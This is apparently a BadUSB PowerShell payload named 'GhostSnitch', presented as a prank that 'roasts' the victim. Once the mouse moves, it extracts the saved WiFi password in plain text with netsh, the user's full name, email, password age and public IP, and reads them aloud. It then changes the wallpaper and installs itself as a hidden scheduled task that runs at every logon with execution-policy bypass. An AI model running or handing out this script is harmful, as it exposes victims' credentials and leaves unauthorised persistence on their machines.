####################################################################################################
# Title       : GhostSnitch
# Version     : 1.0 (Stealth)
# Author      : I am TBJr
# Description : Curiosity was the spark, but roasting you is the flame. Now with stealth mode.
# Directory   : // badusb/Windows/GhostSnitch_Stego/GhostSnitch_Stego.txt
####################################################################################################

# Set up SAPI for text-to-speech
$s = New-Object -ComObject SAPI.SpVoice
$s.Rate = -1

function Get-FullName {
    try {
        $fullName = (net user $env:username | Select-String -Pattern "Full Name").ToString().Split(":")[1].Trim()
    } catch {
        $fullName = $env:username
    }
    return $fullName
}
$fullName = Get-FullName

function Get-RAM {
    try {
        $RAM = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
        $RAM = [int]$RAM
        if ($RAM -lt 4) {
            return "$RAM GB of RAM? This machine is powered by hopes and prayers."
        } elseif ($RAM -lt 8) {
            return "$RAM GB of RAM? Just enough to load your regrets."
        } elseif ($RAM -lt 16) {
            return "$RAM GB? Gamer vibes... if lag was a feature."
        } else {
            return "$RAM GB? Respect. But all muscle and no firewall? Hilarious."
        }
    } catch {
        return "Unable to detect RAM. Maybe the hamster escaped the wheel?"
    }
}

function Get-PubIP {
    try {
        $IP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content.Trim()
        return "Your public IP is $IP. Say hi to the world for me."
    } catch {
        return "Couldn't fetch your public IP. You're a ghost already."
    }
}

function Get-WifiPass {
    try {
        $ssid = (netsh wlan show interface | Select-String ' SSID ').ToString().Split(":")[1].Trim()
        $pass = (netsh wlan show profile name="$ssid" key=clear | Select-String 'Key Content').ToString().Split(":")[1].Trim()
        $length = $pass.Length
        if ($length -lt 8) {
            return "$ssid is your network? That password: $pass ... it's crying for help."
        } elseif ($length -lt 12) {
            return "$ssid's password is $pass — trying, but still failing."
        } else {
            return "$ssid's password is $pass. Secure? Maybe. Still roasted? Definitely."
        }
    } catch {
        return "No WiFi password found. You out here freeloading?"
    }
}

function Get-PasswordAge {
    try {
        $line = (net user $env:UserName | Select-String "Password last set").ToString()
        $dateStr = $line.Substring($line.IndexOf(":")+1).Trim()
        $days = (New-TimeSpan -Start $dateStr -End (Get-Date)).Days
        if ($days -lt 30) {
            return "Changed your password $days days ago. Fresh... but not fresh enough."
        } elseif ($days -lt 180) {
            return "$days days since your last password change. You're cruising for a snoozing."
        } else {
            return "$days days? That password's got mold on it."
        }
    } catch {
        return "Password age unknown. Are you even human?"
    }
}

function Get-Email {
    try {
        $email = (gpresult /z | Select-String -Pattern "\S+@\S+").Matches.Value
        if ($email -like "*gmail*") {
            return "Gmail user? Stylish. But your inbox is probably chaos."
        } elseif ($email -like "*yahoo*") {
            return "Yahoo... in 2025? A digital fossil."
        } elseif ($email -like "*hotmail*") {
            return "Hotmail? Do you also use Netscape?"
        } else {
            return "$email is your email? Obscure. I like it."
        }
    } catch {
        return "No email found. A mystery wrapped in encryption."
    }
}

function Make-StegoWallpaper {
    Add-Type -AssemblyName System.Drawing
    $bmp = New-Object System.Drawing.Bitmap 800, 600
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
    $graphics.Clear([System.Drawing.Color]::Black)
    $font = New-Object System.Drawing.Font "Courier New", 16
    $brush = [System.Drawing.Brushes]::Lime
    $msg = "You've been evaluated.
You're not ready.
- GhostSnitch"
    $graphics.DrawString($msg, $font, $brush, 10, 10)
    $outPath = "$env:TEMP\stego.jpg"
    $bmp.Save($outPath)
    $graphics.Dispose()

    $hidden = "`nStegoMessage: Curiosity sparked the fire. Satisfaction burned the cat."
    [System.IO.File]::AppendAllText($outPath, $hidden)

    Add-Type -TypeDefinition @"
        using System.Runtime.InteropServices;
        public class Wallpaper {
            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }
"@
    [Wallpaper]::SystemParametersInfo(20, 0, $outPath, 3)
}

# Wait for mouse move
Add-Type -AssemblyName System.Windows.Forms
$start = [System.Windows.Forms.Cursor]::Position
while ($true) {
    Start-Sleep -Seconds 2
    if ([System.Windows.Forms.Cursor]::Position.X -ne $start.X -or [System.Windows.Forms.Cursor]::Position.Y -ne $start.Y) {
        break
    }
}

# Speak Roasts
$s.Speak("Hey, $fullName. This is your wake-up roast.")
$s.Speak((Get-RAM))
$s.Speak((Get-PubIP))
$s.Speak((Get-WifiPass))
$s.Speak((Get-PasswordAge))
$s.Speak((Get-Email))
$s.Speak("Your wallpaper holds secrets now.")
Make-StegoWallpaper
$s.Speak("This is GhostSnitch. Logging off.")

# Stealth persistence - Copy to AppData and create scheduled task
$dest = "$env:APPDATA\ghostsnitch.ps1"
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $dest -Force
$task = "schtasks /create /f /sc onlogon /tn GhostSnitch /tr 'powershell -w h -NoP -NonI -Ep Bypass -File `"$dest`"'"
Invoke-Expression $task
